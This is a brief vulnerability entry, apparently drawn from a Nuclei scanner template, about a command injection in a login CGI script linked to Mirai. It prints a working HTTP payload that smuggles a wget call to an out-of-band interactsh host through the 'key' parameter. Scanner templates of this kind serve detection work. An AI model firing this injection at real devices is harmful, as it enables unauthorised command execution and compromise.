# Vulnerability: Mirai - Remote Command Injection
**Classification:** CWE-77
**Source:** Nuclei Template (`mirai-unknown-rce.yaml`)

## Description
Mirai is susceptible to an unknown exploit that targets the login CGI script, where a key parameter is not properly sanitized leading to a command injection vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /cgi-bin/login.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

key=';`wget http://{{interactsh-url}}`;#
```

